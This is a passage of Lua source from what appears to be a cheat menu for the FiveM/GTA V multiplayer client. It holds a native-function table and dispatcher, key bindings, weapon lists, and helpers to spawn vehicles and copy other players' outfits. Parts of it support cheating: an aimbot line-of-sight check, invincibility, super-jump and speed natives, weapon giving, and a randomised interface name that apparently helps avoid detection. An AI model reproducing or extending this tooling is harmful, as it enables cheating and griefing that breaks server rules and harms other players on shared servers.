            ["GetSelectedPedWeapon"] = {
   
                hash = 0x0A6DB4965674D243,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["PedSkipNextReloading"] = {
   
                hash = 0x8C0D57EA686FAD87
   
            },
   
            ["GetMaxAmmoInClip"] = {
   
                hash = 0xA38DCFFCEA8962FA,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetAmmoInClip"] = {
   
                hash = 0x2E1202248937775C,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsPlayerFreeAiming"] = {
   
                hash = 0x2E397FD2ECD37C87,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsPedDoingDriveby"] = {
   
                hash = 0xB2C086CC1BF8F2BF,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["GetEntityPlayerIsFreeAimingAt"] = {
   
                hash = 0x2975C866E6713290,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsPlayerFreeAimingAtEntity"] = {
   
                hash = 0x3C06B5C839B38F7B,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["DisablePlayerFiring"] = {
   
                hash = 0x5E6CC07646BBEAB8
   
            },
   
            ["SetFocusPosAndVel"] = {
   
                hash = 0xBB7454BAFF08FE25
   
            },
   
            ["SetCamCoord"] = {
   
                hash = 0x4D41783FB745E42E
   
            },
   
            ["SetCamFov"] = {
   
                hash = 0xB13C14F66A00D047
   
            },
   
            ["SetCamRot"] = {
   
                hash = 0x85973643155D0B07
   
            },
   
            ["UpdateOnscreenKeyboard"] = {
   
                hash = 0x0CF2B696BBF945AE,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
   
            },
   
            ["CancelOnscreenKeyboard"] = {
   
                hash = 0x58A39BE597CE99CD
   
            },
   
            ["SetVehicleFixed"] = {
   
                hash = 0x115722B1B9C14C1C
   
            },
   
            ["SetVehicleDirtLevel"] = {
   
                hash = 0x79D3B596FE44EE8B
   
            },
   
            ["SetVehicleLights"] = {
   
                hash = 0x34E710FF01247C5A
   
            },
   
            ["SetVehicleHandlingFloat"] = {
   
                hash = 0x488C86D2
   
            },
   
            ["SetVehicleBurnout"] = {
   
                hash = 0xFB8794444A7D60FB
   
            },
   
            ["SetVehicleLightsMode"] = {
   
                hash = 0x1FD09E7390A74D54
   
            },
   
            ["GetCamMatrix"] = {
   
                hash = 0x8f57a89d,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
   
                end
   
            },
   
            ["DoesEntityHaveDrawable"] = {
   
                hash = 0x060D6E96F8B8E48D,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsEntityAnObject"] = {
   
                hash = 0x8D68C8FD0FACA94E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsEntityAVehicle"] = {
   
                hash = 0x6AC7003FA6E5575E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["SetNewWaypoint"] = {
   
                hash = 0xFE43368D2AA4F2FC
   
            },
   
            ["HasEntityLosToOther"] = {
   
                func = function(...)
   
                    local args = {...}
   
                    local ent_one, ent_one_pos = args[1], AREF:GetFunction("GetEntityCoords")(args[1])
   
                    local ent_two, ent_two_pos = args[2], AREF:GetFunction("GetEntityCoords")(args[2])
   
    
   
                    if args[3] == true then
   
                        ent_one_pos = AREF:GetFunction("GetWorldPositionOfEntityBone")(ent_one, AREF:GetFunction("GetPedBoneIndex")(ent_one, 12844))
   
                        ent_two_pos = AREF:GetFunction("GetWorldPositionOfEntityBone")(ent_two, AREF:GetFunction("GetPedBoneIndex")(ent_two, dict.bone_check[AREF.Config.Player.AimbotBone][1]))
   
                    else
   
                        ent_one_pos = AREF:GetFunction("GetWorldPositionOfEntityBone")(ent_one, AREF:GetFunction("GetPedBoneIndex")(ent_one, 12844))
   
                        ent_two_pos = AREF:GetFunction("GetWorldPositionOfEntityBone")(ent_two, AREF:GetFunction("GetPedBoneIndex")(ent_two, args[4]))
   
                    end
   
    
   
                    if not AREF:GetFunction("DoesEntityExist")(ent_one) or not AREF:GetFunction("DoesEntityExist")(ent_two) then return false end
   
                    local trace_id = AREF:GetFunction("StartShapeTestRay")(ent_one_pos.xyz, ent_two_pos.xyz, 4)
   
                    local _, hit, _, _, entity = AREF:GetFunction("GetShapeTestResult")(trace_id)
   
                    if not hit or entity ~= ent_two then return false end
   
                    trace_id = AREF:GetFunction("StartShapeTestRay")(ent_one_pos.xyz, ent_two_pos.xyz, 1)
   
                    local _, hit, _, _, entity = AREF:GetFunction("GetShapeTestResult")(trace_id)
   
    
   
                    return not hit or entity == ent_two
   
                end
   
            },
   
            ["IsEntityAPed"] = {
   
                hash = 0x524AC5ECEA15343E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["GetControlInstructionalButton"] = {
   
                hash = 0x0499D7B09FC9B407,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
   
                end
   
            },
   
            ["DrawScaleformMovie"] = {
   
                hash = 0x54972ADAF0294A93
   
            },
   
            ["SetFocusEntity"] = {
   
                hash = 0x198F77705FA0931D
   
            },
   
            ["DrawLine"] = {
   
                hash = 0x6B7256074AE34680
   
            },
   
            ["DrawPoly"] = {
   
                hash = 0xAC26716048436851
   
            },
   
            ["GetEntityRotation"] = {
   
                hash = 0xAFBD61CC738D9EB9,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
   
                end
   
            },
   
            ["TaskPlayAnim"] = {
   
                hash = 0xEA47FE3719165B94
   
            },
   
            ["TaskVehicleTempAction"] = {
   
                hash = 0xC429DCEEB339E129
   
            },
   
            ["AttachEntityToEntity"] = {
   
                hash = 0x6B9BBD38AB0796DF
   
            },
   
            ["SetRunSprintMultiplierForPlayer"] = {
   
                hash = 0x6DB47AA77FD94E09
   
            },
   
            ["SetSuperJumpThisFrame"] = {
   
                hash = 0x57FFF03E423A4C0B
   
            },
   
            ["SetPedMoveRateOverride"] = {
   
                hash = 0x085BF80FA50A39D1
   
            },
   
            ["DisplayOnscreenKeyboard"] = {
   
                hash = 0x00DC833F2568DBF6
   
            },
   
            ["GetOnscreenKeyboardResult"] = {
   
                hash = 0x8362B09B91893647,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString() end
   
            },
   
            ["SetEntityVisible"] = {
   
                hash = 0xEA1C610A04DB6BBB
   
            },
   
            ["SetEntityInvincible"] = {
   
                hash = 0x3882114BDE571AD4
   
            },
   
            ["TaskSetBlockingOfNonTemporaryEvents"] = {
   
                hash = 0x90D2156198831D69
   
            },
   
            ["GiveWeaponToPed"] = {
   
                hash = 0xBF0FD6E56C964FCB
   
            },
   
            ["SetPedAccuracy"] = {
   
                hash = 0x7AEFB85C1D49DEB6
   
            },
   
            ["SetPedAlertness"] = {
   
                hash = 0xDBA71115ED9941A6
   
            },
   
            ["TaskCombatPed"] = {
   
                hash = 0xF166E48407BAC484
   
            },
   
            ["SetPlayerModel"] = {
   
                hash = 0x00A1CADD00108836,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2]
   
                end
   
            },
   
            ["GetDisplayNameFromVehicleModel"] = {
   
                hash = 0xB215AAC32D25D019,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
   
                end
   
            },
   
            ["SetPedRandomComponentVariation"] = {
   
                hash = 0xC8A9481A01E63C28
   
            },
   
            ["SetPedRandomProps"] = {
   
                hash = 0xC44AA05345C992C6
   
            },
   
            ["SetVehicleEngineOn"] = {
   
                hash = 0x2497C4717C8B881E
   
            },
   
            ["SetVehicleForwardSpeed"] = {
   
                hash = 0xAB54A438726D25D5
   
            },
   
            ["SetVehicleCurrentRpm"] = {
   
                hash = 0x2A01A8FC
   
            },
   
            ["IsModelValid"] = {
   
                hash = 0xC0296A2EDF545E92,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["SetVehicleUndriveable"] = {
   
                hash = 0x8ABA6AF54B942B95
   
            },
   
            ["SetVehicleWheelWidth"] = {
   
                hash = 0x64C3F1C0
   
            },
   
            ["SetVehicleCheatPowerIncrease"] = {
   
                hash = 0xB59E4BD37AE292DB
   
            },
   
            ["SetVehicleEngineHealth"] = {
   
                hash = 0x45F6D8EEF34ABEF1
   
            },
   
            ["IsModelAVehicle"] = {
   
                hash = 0x19AAC8F07BFEC53E,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.type(args[1]) == "string" and AREF:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["IsPedWeaponReadyToShoot"] = {
   
                hash = 0xB80CA294F2F26749,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["SetPedComponentVariation"] = {
   
                hash = 0x262B14F48D29DE80
   
            },
   
            ["GetEntityHealth"] = {
   
                hash = 0xEEF059FAD016D209,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetAmmoInPedWeapon"] = {
   
                hash = 0x015A522136D7F951,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetMaxAmmo"] = {
   
                hash = 0xDC16122C7A20C933,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetAmmoInPedWeapon"] = {
   
                hash = 0x015A522136D7F951,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetPedPropIndex"] = {
   
                hash = 0x898CC20EA75BACD8,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetPedPropTextureIndex"] = {
   
                hash = 0xE131A28626F81AB2,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetPedDrawableVariation"] = {
   
                hash = 0x67F3780DD425D4FC,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetPedTextureVariation"] = {
   
                hash = 0x04A355E041E004E6,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetPedPaletteVariation"] = {
   
                hash = 0xE3DD5F2A84B42281,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["SetPedPropIndex"] = {
   
                hash = 0x93376B65A266EB5F
   
            },
   
            ["SetPedAmmo"] = {
   
                hash = 0x14E56BC5B5DB6A19
   
            },
   
            ["SetAmmoInClip"] = {
   
                hash = 0xDCD2A934D65CB497,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.type(args[2]) == "string" and AREF:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["GetDisabledControlNormal"] = {
   
                hash = 0x11E65974A982637C,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
   
                end
   
            },
   
            ["TaskLookAtEntity"] = {
   
                hash = 0x69F4BE8C8CC4796C
   
            },
   
            ["PointCamAtEntity"] = {
   
                hash = 0x5640BFF86B16E8DC
   
            }
   
        }
   
    
   
        local _bad = {}
   
        local _empty = function() end
   
    
   
        local bad = function(...)
   
            if not _bad[dict.tostring(...)] then
   
                AREF:Print("[NATIVE] Invalid GetFunction call: ^1" .. dict.tostring(...) .. "^7")
   
                _bad[dict.tostring(...)] = true
   
            end
   
    
   
            return _empty
   
        end
   
    
   
        function AREF:GetFunction(name)
   
            if not _natives[name] then return bad(name) end
   
    
   
            if _natives[name].func then
   
                return _natives[name].func
   
            elseif _natives[name].hash then
   
                _natives[name].func = function(...)
   
                    local args = {...}
   
                    local data = _natives[name]
   
                    local hash = data.hash
   
    
   
                    if data.unpack then
   
                        if data.return_as then return data.return_as(dict.Citizen.IN(hash, data.unpack(args))) end
   
    
   
                        return dict.Citizen.IN(hash, data.unpack(args))
   
                    else
   
                        if data.return_as then return data.return_as(dict.Citizen.IN(hash, dict.table.unpack(args))) end
   
    
   
                        return dict.Citizen.IN(hash, dict.table.unpack(args))
   
                    end
   
                end
   
    
   
                return _natives[name].func
   
            end
   
        end
   
    
   
        AREF.DuiName = math.ceil(math.random(100, 5000)) .. "_" .. AREF:GetFunction("GetGameTimer")() .. "_" .. AREF.Build
   
    
   
        AREF.Keys = {
   
            ["ESC"] = 322,
   
            ["F1"] = 288,
   
            ["F2"] = 289,
   
            ["F3"] = 170,
   
            ["F5"] = 166,
   
            ["F6"] = 167,
   
            ["F7"] = 168,
   
            ["F8"] = 169,
   
            ["F9"] = 56,
   
            ["F10"] = 57,
   
            ["~"] = 243,
   
            ["1"] = 157,
   
            ["2"] = 158,
   
            ["3"] = 160,
   
            ["4"] = 164,
   
            ["5"] = 165,
   
            ["6"] = 159,
   
            ["7"] = 161,
   
            ["8"] = 162,
   
            ["9"] = 163,
   
            ["-"] = 84,
   
            ["="] = 83,
   
            ["BACKSPACE"] = 177,
   
            ["TAB"] = 37,
   
            ["Q"] = 44,
   
            ["W"] = 32,
   
            ["E"] = 38,
   
            ["R"] = 45,
   
            ["T"] = 245,
   
            ["Y"] = 246,
   
            ["U"] = 303,
   
            ["P"] = 199,
   
            ["["] = 39,
   
            ["]"] = 40,
   
            ["ENTER"] = 18,
   
            ["CAPS"] = 137,
   
            ["A"] = 34,
   
            ["S"] = 8,
   
            ["D"] = 9,
   
            ["F"] = 23,
   
            ["G"] = 47,
   
            ["H"] = 74,
   
            ["K"] = 311,
   
            ["L"] = 182,
   
            ["LEFTSHIFT"] = 21,
   
            ["Z"] = 20,
   
            ["X"] = 73,
   
            ["C"] = 26,
   
            ["V"] = 0,
   
            ["B"] = 29,
   
            ["N"] = 249,
   
            ["M"] = 244,
   
            [","] = 82,
   
            ["."] = 81,
   
            ["LEFTCTRL"] = 36,
   
            ["LEFTALT"] = 19,
   
            ["SPACE"] = 22,
   
            ["RIGHTCTRL"] = 70,
   
            ["HOME"] = 213,
   
            ["PAGEUP"] = 10,
   
            ["PAGEDOWN"] = 11,
   
            ["DELETE"] = 178,
   
            ["LEFT"] = 174,
   
            ["RIGHT"] = 175,
   
            ["UP"] = 172,
   
            ["DOWN"] = 173,
   
            ["NENTER"] = 201,
   
            ["MWHEELUP"] = 15,
   
            ["MWHEELDOWN"] = 14,
   
            ["N4"] = 108,
   
            ["N5"] = 60,
   
            ["N6"] = 107,
   
            ["N+"] = 96,
   
            ["N-"] = 97,
   
            ["N7"] = 117,
   
            ["N8"] = 61,
   
            ["N9"] = 118,
   
            ["MOUSE1"] = 24,
   
            ["MOUSE2"] = 25,
   
            ["MOUSE3"] = 348
   
        }
   
    
   
        local all_weapons = {"WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_MINISMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_RAYPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_POOLCUE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"}
   
        local all_weapons_hashes = {}
   
    
   
        local give_weapon_list = {
   
            {
   
                Name = "Melee",
   
                Weapons = {"WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_FLARE", "WEAPON_SMOKEGRENADE", "WEAPON_GRENADE", "WEAPON_BALL", "WEAPON_FIREEXTINGUISHER", "WEAPON_MOLOTOV", "WEAPON_SNOWBALL", "WEAPON_PETROLCAN"}
   
            },
   
            {
   
                Name = "Pistols",
   
                Weapons = {"WEAPON_RAYPISTOL", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MACHINEPISTOL"}
   
            },
   
            {
   
                Name = "SMGs",
   
                Weapons = {"WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_MINISMG", "WEAPON_ASSAULTSMG", "WEAPON_MICROSMG", "WEAPON_COMBATPDW"}
   
            },
   
            {
   
                Name = "Rifles",
   
                Weapons = {"WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG", "WEAPON_ASSAULTSMG", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MUSKET"}
   
            },
   
            {
   
                Name = "Shotguns",
   
                Weapons = {"WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_PUMPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_BULLPUPSHOTGUN"}
   
            },
   
            {
   
                Name = "Snipers",
   
                Weapons = {"WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE"}
   
            },
   
            {
   
                Name = "Heavy",
   
                Weapons = {"WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_HOMINGLAUNCHER", "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_STINGER"}
   
            }
   
        }
   
    
   
        AREF.Notifications = {}
   
    
   
        local function _clamp(val, min, max)
   
            if val < min then return min end
   
            if val > max then return max end
   
    
   
            return val
   
        end
   
    
   
        function AREF:EquipOutfit(ped, data)
   
            SetPedPropIndex(ped, 0, data.hat, data.hat_texture, 1)
   
            SetPedPropIndex(ped, 1, data.glasses, data.glasses_texture, 1)
   
            SetPedPropIndex(ped, 2, data.ear, data.ear_texture, 1)
   
            SetPedPropIndex(ped, 6, data.watch, data.watch_texture, 1)
   
            SetPedPropIndex(ped, 7, data.wrist, data.wrist_texture, 1)
   
            SetPedComponentVariation(ped, 0, data.head.draw, data.head.texture, data.head.palette)
   
            SetPedComponentVariation(ped, 1, data.beard.draw, data.beard.texture, data.beard.palette)
   
            SetPedComponentVariation(ped, 2, data.hair.draw, data.hair.texture, data.hair.palette)
   
            SetPedComponentVariation(ped, 3, data.torso.draw, data.torso.texture, data.torso.palette)
   
            SetPedComponentVariation(ped, 4, data.legs.draw, data.legs.texture, data.legs.palette)
   
            SetPedComponentVariation(ped, 5, data.hands.draw, data.hands.texture, data.hands.palette)
   
            SetPedComponentVariation(ped, 6, data.feet.draw, data.feet.texture, data.feet.palette)
   
            SetPedComponentVariation(ped, 7, data.accessory_1.draw, data.accessory_1.texture, data.accessory_1.palette)
   
            SetPedComponentVariation(ped, 8, data.accessory_2.draw, data.accessory_2.texture, data.accessory_2.palette)
   
            SetPedComponentVariation(ped, 9, data.accessory_3.draw, data.accessory_3.texture, data.accessory_3.palette)
   
            SetPedComponentVariation(ped, 10, data.mask.draw, data.mask.texture, data.mask.palette)
   
            SetPedComponentVariation(ped, 11, data.auxillary.draw, data.auxillary.texture, data.auxillary.palette)
   
        end
   
    
   
        function AREF:StealOutfit(ped, p_ped)
   
            self:EquipOutfit(ped, {
   
                hat = GetPedPropIndex(p_ped, 0),
   
                hat_texture = GetPedPropTextureIndex(p_ped, 0),
   
                glasses = GetPedPropIndex(p_ped, 1),
   
                glasses_texture = GetPedPropTextureIndex(p_ped, 1),
   
                ear = GetPedPropIndex(p_ped, 2),
   
                ear_texture = GetPedPropTextureIndex(p_ped, 2),
   
                watch = GetPedPropIndex(p_ped, 6),
   
                watch_texture = GetPedPropTextureIndex(p_ped, 6),
   
                wrist = GetPedPropIndex(p_ped, 7),
   
                wrist_texture = GetPedPropTextureIndex(p_ped, 7),
   
                head = {
   
                    draw = GetPedDrawableVariation(p_ped, 0),
   
                    texture = GetPedTextureVariation(p_ped, 0),
   
                    palette = GetPedPaletteVariation(p_ped, 0)
   
                },
   
                beard = {
   
                    draw = GetPedDrawableVariation(p_ped, 1),
   
                    texture = GetPedTextureVariation(p_ped, 1),
   
                    palette = GetPedPaletteVariation(p_ped, 1)
   
                },
   
                hair = {
   
                    draw = GetPedDrawableVariation(p_ped, 2),
   
                    texture = GetPedTextureVariation(p_ped, 2),
   
                    palette = GetPedPaletteVariation(p_ped, 2)
   
                },
   
                torso = {
   
                    draw = GetPedDrawableVariation(p_ped, 3),
   
                    texture = GetPedTextureVariation(p_ped, 3),
   
                    palette = GetPedPaletteVariation(p_ped, 3)
   
                },
   
                legs = {
   
                    draw = GetPedDrawableVariation(p_ped, 4),
   
                    texture = GetPedTextureVariation(p_ped, 4),
   
                    palette = GetPedPaletteVariation(p_ped, 4)
   
                },
   
                hands = {
   
                    draw = GetPedDrawableVariation(p_ped, 5),
   
                    texture = GetPedTextureVariation(p_ped, 5),
   
                    palette = GetPedPaletteVariation(p_ped, 5)
   
                },
   
                feet = {
   
                    draw = GetPedDrawableVariation(p_ped, 6),
   
                    texture = GetPedTextureVariation(p_ped, 6),
   
                    palette = GetPedPaletteVariation(p_ped, 6)
   
                },
   
                accessory_1 = {
   
                    draw = GetPedDrawableVariation(p_ped, 7),
   
                    texture = GetPedTextureVariation(p_ped, 7),
   
                    palette = GetPedPaletteVariation(p_ped, 7)
   
                },
   
                accessory_2 = {
   
                    draw = GetPedDrawableVariation(p_ped, 8),
   
                    texture = GetPedTextureVariation(p_ped, 8),
   
                    palette = GetPedPaletteVariation(p_ped, 8)
   
                },
   
                accessory_3 = {
   
                    draw = GetPedDrawableVariation(p_ped, 9),
   
                    texture = GetPedTextureVariation(p_ped, 9),
   
                    palette = GetPedPaletteVariation(p_ped, 9)
   
                },
   
                mask = {
   
                    draw = GetPedDrawableVariation(p_ped, 10),
   
                    texture = GetPedTextureVariation(p_ped, 10),
   
                    palette = GetPedPaletteVariation(p_ped, 10)
   
                },
   
                auxillary = {
   
                    draw = GetPedDrawableVariation(p_ped, 11),
   
                    texture = GetPedTextureVariation(p_ped, 11),
   
                    palette = GetPedPaletteVariation(p_ped, 11)
   
                }
   
            })
   
        end
   
    
   
        function AREF:RequestModelSync(model, timeout)
   
            timeout = timeout or 2500
   
            local counter = 0
   
            self:GetFunction("RequestModel")(model)
   
    
   
            while not self:GetFunction("HasModelLoaded")(model) do
   
                self:GetFunction("RequestModel")(model)
   
                counter = counter + 100
   
                Wait(100)
   
                if counter >= timeout then return false end
   
            end
   
    
   
            return true
   
        end
   
    
   
        function AREF.Util:ValidPlayer(src)
   
            if not src then return false end
   
    
   
            return AREF:GetFunction("GetPlayerServerId")(src) ~= nil and AREF:GetFunction("GetPlayerServerId")(src) > 0
   
        end
   
    
   
        function AREF:SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)
   
            CreateThread(function()
   
                local speed = 0
   
                local rpm = 0
   
    
   
                if self:GetFunction("IsModelValid")(modelName) and self:GetFunction("IsModelAVehicle")(modelName) then
   
                    self:GetFunction("RequestModel")(modelName)
   
    
   
                    while not self:GetFunction("HasModelLoaded")(modelName) do
   
                        Wait(0)
   
                    end
   
    
   
                    if replaceCurrent and self:GetFunction("IsPedInAnyVehicle")(self.LocalPlayer) then
   
                        self.Util:DeleteEntity(self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer))
   
                    end
   
    
   
                    local pos = (spawnInside and self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0) or self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 4.0, 0.0))
   
                    local heading = self:GetFunction("GetEntityHeading")(self.LocalPlayer) + (spawnInside and 0 or 90)
   
                    local vehicle = self:GetFunction("CreateVehicle")(self:GetFunction("GetHashKey")(modelName), pos.x, pos.y, pos.z, heading, true, false)
   
                    self:GetFunction("SetPedIntoVehicle")(self.LocalPlayer, vehicle, -1)
   
                    self:GetFunction("SetVehicleEngineOn")(vehicle, true, true)
